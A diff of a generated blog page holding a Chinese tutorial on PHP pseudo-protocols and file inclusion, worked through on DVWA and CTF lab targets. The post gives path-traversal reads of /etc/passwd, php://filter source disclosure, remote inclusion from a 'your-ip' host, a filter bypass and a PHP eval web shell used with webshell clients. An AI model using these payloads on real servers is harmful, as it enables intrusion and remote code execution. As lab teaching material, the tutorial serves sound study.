@@ -13,7 +13,7 @@
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: 在 action 测试所有的伪协议，测试 DVWA 的包含漏洞及获取虚拟机中的 flag\n\n\n\n\n\n\n测试所有伪协议基础知识\n12file://绝对路径file://C:\\\\Windows\\win.ini\n\n对方服务器上的路径，文件包含时，不能有后缀，如果有后缀，尝试 00 截断以及长文件名截断。\n\n12http://指定urlhttp://www.123.com/a.txt?\n\n使用 ?或 # 绕过后缀，当用在 include 中的同时，要求 php.ini 文件中，allow_url_include=On；当用在 file 类函数中的同时，要求 php.ini 文件中，allow_url_fopen=On\n\n1234php://php://input 接收到 post 数据php://filter/read=convert.base64-encode/resource=a.php# 读取a.php的内容，并且base64编码，主要作用用来读php文件源代码\n\npost 提交 uname=zs&amp;upass=123456，php://input 收到的内容就是 name=zs&amp;upass=123456，不能有后缀，当用在 include 中的同时，要求 php.ini 文件中，allow_url_include=On ，当用在 file 类函数的同时，要求 php.ini 文件中，allow_url_fopen=On。\nphp://filter 可以使用相对路径，以及绝对路径，不能有后缀。当用在 include 中同时，要求 php.ini 文件中，allow_url_include=On/Off，当用在 file 类函数中，要求 php.ini 文件中 allow_url_fopen=On/Off。\n\n12data://data://text/plain,abc\n\ndata://text/plain;base64,YWJj就会收到 abc，当用在 include 中，要求 php.ini文件中，allow_url_include=On，当用在 file 类函数中，要求 php.ini 文件中，allow_url_fopen=On。\n![](D:\\myproject\\Blog\\source\\images\\PHP 伪协议.png)\n遇到一个网站该如何入手？\n\n\n\n测试 action打开 action2 网页，收集信息。因为有后缀，所以无法使用 file://绝对路径 读取目标服务器上的文件。\n\n然后修改 action=./news 观察页面变化。\n\n进入页面后，发现没有变化。故该页面可能存在文件包含漏洞。\n\n使用 php://filter/read=convert.base64-encode/resource=news 看是否能读出内容。\n\n把读出来的内容进行解码，可以获取到源码。\n\n使用 data://text/plain,abc&lt;?php phpinfo();?&gt; 判断能否使用远程包含。\n\n打开 action3 网页，收集信息。\n\n使用 ./news 判断是否可能存在文件包含漏洞。\n\n尝试读取源码。\n\nDVWA 中的包含漏洞难度 low访问首页，收集信息，由下图可知该服务器系统为 CentOS 。\n\n修改 page=./include.php ，观察页面的变化。\n\n发现页面无变化，可能存在文件包含漏洞。直接访问 /etc/passwd 文件。修改 page=../../../../../../etc/passwd。\n\n读取源码。修改 page=php://filter/read=convert.base64-encode/resource=include.php。\n\n解码。\n\n修改 page=data://text/plain,abc &lt;?php phpinfo();?&gt;，判断能否远程文件包含。\n\n在远程服务器上放 show.php ，文件内容为 &lt;?php phpinfo();?&gt;，修改 page=http://your-ip/show.php，查看。\n\n在远程服务器上放 cmd.php，文件内容为 &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;，修改 page=http://your-ip/show.php，查看。\n\n直接用菜刀/蚁剑连接，连接不成功。转换思路，用文件上传功能上传一个木马，然后找到它，用蚁剑连接即可。\n先上传一个正常的图片，发现可以看见路径。很明显该路径为相对路径。\n\n把 url 和路径拼接起来，\n\n确定后，看到图片，并且上传图片的路径也清晰明了。\n\n上传一个木马，用菜刀/蚁剑连接。\n\n根据前面查到的路径，直接连接。\n\n难度 medium访问 ./include.php，故可能存在文件包含。\n\n修改 page=../../../../../etc/passwd\n\n改为 page=/etc/passwd 可以取得内容。\n\n再次修改 page=....//....//....//....//....//....//etc/passwd，可以得到内容，所以程序很可能对敏感字符做了处理，但是可以通过双拼绕过。\n\n修改 page=php://filter/read=convert.base64-encode/resource=include.php，查看源码。\n\n解码可得源码。\n1234567891011121314151617181920212223242526272829&lt;?php// Check if the right PHP functions are enabled$WarningHtml = '';if( !ini_get( 'allow_url_include' ) ) &#123;\t$WarningHtml .= \"&lt;div class=\\\"warning\\\"&gt;The PHP function &lt;em&gt;allow_url_include&lt;/em&gt; is not enabled.&lt;/div&gt;\";&#125;if( !ini_get( 'allow_url_fopen' ) ) &#123;\t$WarningHtml .= \"&lt;div class=\\\"warning\\\"&gt;The PHP function &lt;em&gt;allow_url_fopen&lt;/em&gt; is not enabled.&lt;/div&gt;\";&#125;$page[ 'body' ] .= \"&lt;div class=\\\"body_padded\\\"&gt;\t&lt;h1&gt;Vulnerability: File Inclusion&lt;/h1&gt;\t&#123;$WarningHtml&#125;\t&lt;div class=\\\"vulnerable_code_area\\\"&gt;\t\t[&lt;em&gt;&lt;a href=\\\"?page=file1.php\\\"&gt;file1.php&lt;/a&gt;&lt;/em&gt;] - [&lt;em&gt;&lt;a href=\\\"?page=file2.php\\\"&gt;file2.php&lt;/a&gt;&lt;/em&gt;] - [&lt;em&gt;&lt;a href=\\\"?page=file3.php\\\"&gt;file3.php&lt;/a&gt;&lt;/em&gt;]\t&lt;/div&gt;\t&lt;h2&gt;More Information&lt;/h2&gt;\t&lt;ul&gt;\t\t&lt;li&gt;\" . dvwaExternalLinkUrlGet( 'https://en.wikipedia.org/wiki/Remote_File_Inclusion' ) . \"&lt;/li&gt;\t\t&lt;li&gt;\" . dvwaExternalLinkUrlGet( 'https://www.owasp.org/index.php/Top_10_2007-A3' ) . \"&lt;/li&gt;\t&lt;/ul&gt;&lt;/div&gt;\\n\";?&gt;\n\n修改 page=data://text/plain,abc &lt;?php phpinfo();?&gt;，查看页面。\n\n修改 page=http://your-ip/show.php ，利用远程包含，发现没有显示内容。\n\n由于 php://filter 和 data://都显示内容了，所以很可能对 http 这四个字符做了处理。尝试了 http 字符多个位置双拼都不行，可能是对 http:// 做了处理，尝试下 httphttp://:// ，发现可以绕过。修改 page=httphttp://://your-ip/show.php。查看页面。\n\n难度 high修改 page=./include.php。\n\n获取虚拟机中的 flag查看源码\n123456789101112131415161718192021222324252627&lt;!-- $a=isset($_GET[\"a\"])?$_GET[\"a\"]:'';$b=isset($_GET[\"b\"])?$_GET[\"b\"]:'';$c=isset($_GET[\"c\"])?$_GET[\"c\"]:'';$d=isset($_GET[\"d\"])?$_GET[\"d\"]:'';$e=isset($_GET['e'])?$_GET['e']:'';if(preg_match('/php/i', $a))&#123;    die(\"This not allow pseudo protocol!\");&#125;if(preg_match('/\\.\\./', $a))&#123;    die(\"This also not allow!\");&#125;if((@file_get_contents($a,'r')===$b)&amp;&amp;(@file_get_contents($e,'r')===\"I'm Administrator!\"))&#123;    echo \"hello admin!&lt;br&gt;\";    if(preg_match(\"/flag/\",$c))&#123;        echo \"不能现在就给你flag哦\";        exit();    &#125;else&#123;          // get class.php        @include($c);    &#125;  &#125;else&#123;    echo \"you are not admin ! &lt;br&gt;\";&#125; --&gt;\n\n简单的流程图\n\n对 a 使用远程包含的方法输入值，对 b 直接输入值，对 e 使用 php://input 的方法。\n\n","dateCreated":"2019-09-19T14:52:10+08:00","dateModified":"2019-09-19T21:05:34+08:00","datePublished":"2019-09-19T14:52:10+08:00","description":"Abstract: 在 action 测试所有的伪协议，测试 DVWA 的包含漏洞及获取虚拟机中的 flag","headline":"php伪协议","image":["https://images.unsplash.com/photo-1568021735466-efd8a4c435af?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1489&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/19/php伪协议/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/19/php伪协议/","keywords":"PHP 伪协议","thumbnailUrl":"https://images.unsplash.com/photo-1568021735466-efd8a4c435af?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1489&q=80"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: 在 action 测试所有的伪协议，测试 DVWA 的包含漏洞及获取虚拟机中的 flag\n\n\n\n\n\n\n测试所有伪协议基础知识\n12file://绝对路径file://C:\\\\Windows\\win.ini\n\n对方服务器上的路径，文件包含时，不能有后缀，如果有后缀，尝试 00 截断以及长文件名截断。\n\n12http://指定urlhttp://www.123.com/a.txt?\n\n使用 ?或 # 绕过后缀，当用在 include 中的同时，要求 php.ini 文件中，allow_url_include=On；当用在 file 类函数中的同时，要求 php.ini 文件中，allow_url_fopen=On\n\n1234php://php://input 接收到 post 数据php://filter/read=convert.base64-encode/resource=a.php# 读取a.php的内容，并且base64编码，主要作用用来读php文件源代码\n\npost 提交 uname=zs&amp;upass=123456，php://input 收到的内容就是 name=zs&amp;upass=123456，不能有后缀，当用在 include 中的同时，要求 php.ini 文件中，allow_url_include=On ，当用在 file 类函数的同时，要求 php.ini 文件中，allow_url_fopen=On。\nphp://filter 可以使用相对路径，以及绝对路径，不能有后缀。当用在 include 中同时，要求 php.ini 文件中，allow_url_include=On/Off，当用在 file 类函数中，要求 php.ini 文件中 allow_url_fopen=On/Off。\n\n12data://data://text/plain,abc\n\ndata://text/plain;base64,YWJj就会收到 abc，当用在 include 中，要求 php.ini文件中，allow_url_include=On，当用在 file 类函数中，要求 php.ini 文件中，allow_url_fopen=On。\n\n遇到一个网站该如何入手？\n\n\n\n测试 action打开 action2 网页，收集信息。因为有后缀，所以无法使用 file://绝对路径 读取目标服务器上的文件。\n\n然后修改 action=./news 观察页面变化。\n\n进入页面后，发现没有变化。故该页面可能存在文件包含漏洞。\n\n使用 php://filter/read=convert.base64-encode/resource=news 看是否能读出内容。\n\n把读出来的内容进行解码，可以获取到源码。\n\n使用 data://text/plain,abc&lt;?php phpinfo();?&gt; 判断能否使用远程包含。\n\n打开 action3 网页，收集信息。\n\n使用 ./news 判断是否可能存在文件包含漏洞。\n\n尝试读取源码。\n\nDVWA 中的包含漏洞难度 low访问首页，收集信息，由下图可知该服务器系统为 CentOS 。\n\n修改 page=./include.php ，观察页面的变化。\n\n发现页面无变化，可能存在文件包含漏洞。直接访问 /etc/passwd 文件。修改 page=../../../../../../etc/passwd。\n\n读取源码。修改 page=php://filter/read=convert.base64-encode/resource=include.php。\n\n解码。\n\n修改 page=data://text/plain,abc &lt;?php phpinfo();?&gt;，判断能否远程文件包含。\n\n在远程服务器上放 show.php ，文件内容为 &lt;?php phpinfo();?&gt;，修改 page=http://your-ip/show.php，查看。\n\n在远程服务器上放 cmd.php，文件内容为 &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;，修改 page=http://your-ip/show.php，查看。\n\n直接用菜刀/蚁剑连接，连接不成功。转换思路，用文件上传功能上传一个木马，然后找到它，用蚁剑连接即可。\n先上传一个正常的图片，发现可以看见路径。很明显该路径为相对路径。\n\n把 url 和路径拼接起来，\n\n确定后，看到图片，并且上传图片的路径也清晰明了。\n\n上传一个木马，用菜刀/蚁剑连接。\n\n根据前面查到的路径，直接连接。\n\n难度 medium访问 ./include.php，故可能存在文件包含。\n\n修改 page=../../../../../etc/passwd\n\n改为 page=/etc/passwd 可以取得内容。\n\n再次修改 page=....//....//....//....//....//....//etc/passwd，可以得到内容，所以程序很可能对敏感字符做了处理，但是可以通过双拼绕过。\n\n修改 page=php://filter/read=convert.base64-encode/resource=include.php，查看源码。\n\n解码可得源码。\n1234567891011121314151617181920212223242526272829&lt;?php// Check if the right PHP functions are enabled$WarningHtml = '';if( !ini_get( 'allow_url_include' ) ) &#123;\t$WarningHtml .= \"&lt;div class=\\\"warning\\\"&gt;The PHP function &lt;em&gt;allow_url_include&lt;/em&gt; is not enabled.&lt;/div&gt;\";&#125;if( !ini_get( 'allow_url_fopen' ) ) &#123;\t$WarningHtml .= \"&lt;div class=\\\"warning\\\"&gt;The PHP function &lt;em&gt;allow_url_fopen&lt;/em&gt; is not enabled.&lt;/div&gt;\";&#125;$page[ 'body' ] .= \"&lt;div class=\\\"body_padded\\\"&gt;\t&lt;h1&gt;Vulnerability: File Inclusion&lt;/h1&gt;\t&#123;$WarningHtml&#125;\t&lt;div class=\\\"vulnerable_code_area\\\"&gt;\t\t[&lt;em&gt;&lt;a href=\\\"?page=file1.php\\\"&gt;file1.php&lt;/a&gt;&lt;/em&gt;] - [&lt;em&gt;&lt;a href=\\\"?page=file2.php\\\"&gt;file2.php&lt;/a&gt;&lt;/em&gt;] - [&lt;em&gt;&lt;a href=\\\"?page=file3.php\\\"&gt;file3.php&lt;/a&gt;&lt;/em&gt;]\t&lt;/div&gt;\t&lt;h2&gt;More Information&lt;/h2&gt;\t&lt;ul&gt;\t\t&lt;li&gt;\" . dvwaExternalLinkUrlGet( 'https://en.wikipedia.org/wiki/Remote_File_Inclusion' ) . \"&lt;/li&gt;\t\t&lt;li&gt;\" . dvwaExternalLinkUrlGet( 'https://www.owasp.org/index.php/Top_10_2007-A3' ) . \"&lt;/li&gt;\t&lt;/ul&gt;&lt;/div&gt;\\n\";?&gt;\n\n修改 page=data://text/plain,abc &lt;?php phpinfo();?&gt;，查看页面。\n\n修改 page=http://your-ip/show.php ，利用远程包含，发现没有显示内容。\n\n由于 php://filter 和 data://都显示内容了，所以很可能对 http 这四个字符做了处理。尝试了 http 字符多个位置双拼都不行，可能是对 http:// 做了处理，尝试下 httphttp://:// ，发现可以绕过。修改 page=httphttp://://your-ip/show.php。查看页面。\n\n难度 high修改 page=./include.php。\n\n获取虚拟机中的 flag查看源码\n123456789101112131415161718192021222324252627&lt;!-- $a=isset($_GET[\"a\"])?$_GET[\"a\"]:'';$b=isset($_GET[\"b\"])?$_GET[\"b\"]:'';$c=isset($_GET[\"c\"])?$_GET[\"c\"]:'';$d=isset($_GET[\"d\"])?$_GET[\"d\"]:'';$e=isset($_GET['e'])?$_GET['e']:'';if(preg_match('/php/i', $a))&#123;    die(\"This not allow pseudo protocol!\");&#125;if(preg_match('/\\.\\./', $a))&#123;    die(\"This also not allow!\");&#125;if((@file_get_contents($a,'r')===$b)&amp;&amp;(@file_get_contents($e,'r')===\"I'm Administrator!\"))&#123;    echo \"hello admin!&lt;br&gt;\";    if(preg_match(\"/flag/\",$c))&#123;        echo \"不能现在就给你flag哦\";        exit();    &#125;else&#123;          // get class.php        @include($c);    &#125;  &#125;else&#123;    echo \"you are not admin ! &lt;br&gt;\";&#125; --&gt;\n\n简单的流程图\n\n对 a 使用远程包含的方法输入值，对 b 直接输入值，对 e 使用 php://input 的方法。\n\n","dateCreated":"2019-09-19T14:52:10+08:00","dateModified":"2019-09-19T21:54:03+08:00","datePublished":"2019-09-19T14:52:10+08:00","description":"Abstract: 在 action 测试所有的伪协议，测试 DVWA 的包含漏洞及获取虚拟机中的 flag","headline":"php伪协议","image":["https://images.unsplash.com/photo-1568021735466-efd8a4c435af?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1489&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/19/php伪协议/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/19/php伪协议/","keywords":"PHP 伪协议","thumbnailUrl":"https://images.unsplash.com/photo-1568021735466-efd8a4c435af?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1489&q=80"}</script>
     <meta name="description" content="Abstract: 在 action 测试所有的伪协议，测试 DVWA 的包含漏洞及获取虚拟机中的 flag">
 <meta name="keywords" content="PHP 伪协议">
 <meta property="og:type" content="blog">
@@ -22,45 +22,46 @@
 <meta property="og:site_name" content="han个人博客">
 <meta property="og:description" content="Abstract: 在 action 测试所有的伪协议，测试 DVWA 的包含漏洞及获取虚拟机中的 flag">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro1.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro2.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro3.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro4.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro5.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro6.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro7.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro8.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa1.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa2.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa3.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa4.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa5.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa6.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa7.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa8.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa9.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa10.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa11.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa12.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa13.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa14.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa15.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa16.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa19.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa17.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa18.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa20.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa21.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa22.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa23.png">
-<meta property="og:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa24.png">
-<meta property="og:updated_time" content="2019-09-19T13:05:34.407Z">
+<meta property="og:image" content="http://yoursite.com/images/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.png">
+<meta property="og:image" content="http://yoursite.com/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png">
+<meta property="og:image" content="http://yoursite.com/images/125pro.png">
+<meta property="og:image" content="http://yoursite.com/images/125pro1.png">
+<meta property="og:image" content="http://yoursite.com/images/125pro2.png">
+<meta property="og:image" content="http://yoursite.com/images/125pro3.png">
+<meta property="og:image" content="http://yoursite.com/images/125pro4.png">
+<meta property="og:image" content="http://yoursite.com/images/125pro5.png">
+<meta property="og:image" content="http://yoursite.com/images/125pro6.png">
+<meta property="og:image" content="http://yoursite.com/images/125pro7.png">
+<meta property="og:image" content="http://yoursite.com/images/125pro8.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa1.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa2.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa3.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa4.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa5.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa6.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa7.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa8.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa9.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa10.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa11.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa12.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa13.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa14.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa15.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa16.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa19.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa17.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa18.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa20.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa21.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa22.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa23.png">
+<meta property="og:image" content="http://yoursite.com/images/125dvwa24.png">
+<meta property="og:updated_time" content="2019-09-19T13:54:03.094Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php伪协议">
 <meta name="twitter:description" content="Abstract: 在 action 测试所有的伪协议，测试 DVWA 的包含漏洞及获取虚拟机中的 flag">
-<meta name="twitter:image" content="d:%5Cmyproject%5CBlog%5Csource%5Cimages%5C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png">
+<meta name="twitter:image" content="http://yoursite.com/images/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.png">
     
     
         
@@ -345,84 +346,84 @@
 <li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://</span><br><span class="line">data://text/plain,abc</span><br></pre></td></tr></table></figure>
 
 <p><code>data://text/plain;base64,YWJj</code>就会收到 <code>abc</code>，当用在 <code>include</code> 中，要求 <code>php.ini</code>文件中，<code>allow_url_include=On</code>，当用在 <code>file</code> 类函数中，要求 <code>php.ini</code> 文件中，<code>allow_url_fopen=On</code>。</p>
-<p>![](D:\myproject\Blog\source\images\PHP 伪协议.png)</p>
+<p><img src="/images/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.png" alt></p>
 <p>遇到一个网站该如何入手？</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png" alt></p>
+<p><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png" alt></p>
 </li>
 </ul>
 <h4 id="测试-action"><a href="#测试-action" class="headerlink" title="测试 action"></a>测试 action</h4><p>打开 <code>action2</code> 网页，收集信息。因为有后缀，所以无法使用 <code>file://绝对路径</code> 读取目标服务器上的文件。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro.png" alt></p>
+<p><img src="/images/125pro.png" alt></p>
 <p>然后修改 <code>action=./news</code> 观察页面变化。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro1.png" alt></p>
+<p><img src="/images/125pro1.png" alt></p>
 <p>进入页面后，发现没有变化。故该页面可能存在文件包含漏洞。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro2.png" alt></p>
+<p><img src="/images/125pro2.png" alt></p>
 <p>使用 <code>php://filter/read=convert.base64-encode/resource=news</code> 看是否能读出内容。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro3.png" alt></p>
+<p><img src="/images/125pro3.png" alt></p>
 <p>把读出来的内容进行解码，可以获取到源码。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro4.png" alt></p>
+<p><img src="/images/125pro4.png" alt></p>
 <p>使用 <code>data://text/plain,abc&lt;?php phpinfo();?&gt;</code> 判断能否使用远程包含。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro5.png" alt></p>
+<p><img src="/images/125pro5.png" alt></p>
 <p>打开 <code>action3</code> 网页，收集信息。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro6.png" alt></p>
+<p><img src="/images/125pro6.png" alt></p>
 <p>使用 <code>./news</code> 判断是否可能存在文件包含漏洞。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro7.png" alt></p>
+<p><img src="/images/125pro7.png" alt></p>
 <p>尝试读取源码。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125pro8.png" alt></p>
+<p><img src="/images/125pro8.png" alt></p>
 <h3 id="DVWA-中的包含漏洞"><a href="#DVWA-中的包含漏洞" class="headerlink" title="DVWA 中的包含漏洞"></a>DVWA 中的包含漏洞</h3><h4 id="难度-low"><a href="#难度-low" class="headerlink" title="难度 low"></a>难度 low</h4><p>访问首页，收集信息，由下图可知该服务器系统为 <code>CentOS</code> 。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa1.png" alt></p>
+<p><img src="/images/125dvwa1.png" alt></p>
 <p>修改 <code>page=./include.php</code> ，观察页面的变化。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa2.png" alt></p>
+<p><img src="/images/125dvwa2.png" alt></p>
 <p>发现页面无变化，可能存在文件包含漏洞。直接访问 <code>/etc/passwd</code> 文件。修改 <code>page=../../../../../../etc/passwd</code>。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa3.png" alt></p>
+<p><img src="/images/125dvwa3.png" alt></p>
 <p>读取源码。修改 <code>page=php://filter/read=convert.base64-encode/resource=include.php</code>。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa4.png" alt></p>
+<p><img src="/images/125dvwa4.png" alt></p>
 <p>解码。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa5.png" alt></p>
+<p><img src="/images/125dvwa5.png" alt></p>
 <p>修改 <code>page=data://text/plain,abc &lt;?php phpinfo();?&gt;</code>，判断能否远程文件包含。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa6.png" alt></p>
+<p><img src="/images/125dvwa6.png" alt></p>
 <p>在远程服务器上放 <code>show.php</code> ，文件内容为 <code>&lt;?php phpinfo();?&gt;</code>，修改 <code>page=http://your-ip/show.php</code>，查看。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa7.png" alt></p>
+<p><img src="/images/125dvwa7.png" alt></p>
 <p>在远程服务器上放 <code>cmd.php</code>，文件内容为 <code>&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</code>，修改 <code>page=http://your-ip/show.php</code>，查看。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa8.png" alt></p>
+<p><img src="/images/125dvwa8.png" alt></p>
 <p>直接用菜刀/蚁剑连接，连接不成功。转换思路，用文件上传功能上传一个木马，然后找到它，用蚁剑连接即可。</p>
 <p>先上传一个正常的图片，发现可以看见路径。很明显该路径为相对路径。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa9.png" alt></p>
+<p><img src="/images/125dvwa9.png" alt></p>
 <p>把 <code>url</code> 和路径拼接起来，</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa10.png" alt></p>
+<p><img src="/images/125dvwa10.png" alt></p>
 <p>确定后，看到图片，并且上传图片的路径也清晰明了。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa11.png" alt></p>
+<p><img src="/images/125dvwa11.png" alt></p>
 <p>上传一个木马，用菜刀/蚁剑连接。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa12.png" alt></p>
+<p><img src="/images/125dvwa12.png" alt></p>
 <p>根据前面查到的路径，直接连接。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa13.png" alt></p>
+<p><img src="/images/125dvwa13.png" alt></p>
 <h4 id="难度-medium"><a href="#难度-medium" class="headerlink" title="难度 medium"></a>难度 medium</h4><p>访问 <code>./include.php</code>，故可能存在文件包含。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa14.png" alt></p>
+<p><img src="/images/125dvwa14.png" alt></p>
 <p>修改 <code>page=../../../../../etc/passwd</code></p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa15.png" alt></p>
+<p><img src="/images/125dvwa15.png" alt></p>
 <p>改为 <code>page=/etc/passwd</code> 可以取得内容。</p>
